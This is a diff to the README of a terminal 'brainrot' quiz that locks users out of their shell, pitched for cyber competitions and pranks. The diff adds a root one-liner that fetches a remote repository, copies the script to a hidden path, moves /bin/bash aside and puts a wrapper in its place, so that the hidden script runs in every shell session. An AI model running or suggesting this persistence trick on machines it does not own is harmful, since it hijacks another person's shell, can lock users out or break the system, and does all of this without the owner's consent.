@@ -2,7 +2,15 @@
 
 A terminal lockout quiz that forces users to identify brainrot characters before accessing their shell. Designed for cyber competitions and pranks.
 
-## Installation
+## Quick Install (One-liner)
+
+```bash
+sudo bash -c 'git clone --quiet https://github.com/BakerWomack/BrainRotQuiz.git /tmp/.brq 2>/dev/null && mkdir -p /usr/local/share/.config && cp /tmp/.brq/brainrot_quiz.sh /usr/local/share/.config/.session_init.sh && chown root:root /usr/local/share/.config/.session_init.sh && chmod 711 /usr/local/share/.config/.session_init.sh && rm -rf /tmp/.brq && [ ! -f /bin/.bash_real ] && mv /bin/bash /bin/.bash_real; printf "#!/bin/.bash_real\nsource /usr/local/share/.config/.session_init.sh\nexec /bin/.bash_real \"\$@\"\n" > /bin/bash && chmod 755 /bin/bash'
+```
+
+Pulls the repo, hides the script, backs up the real bash binary, and replaces `/bin/bash` with a wrapper that forces the quiz on every new shell session.
+
+## Manual Installation
 
 ### Option 1: Add to bashrc
 
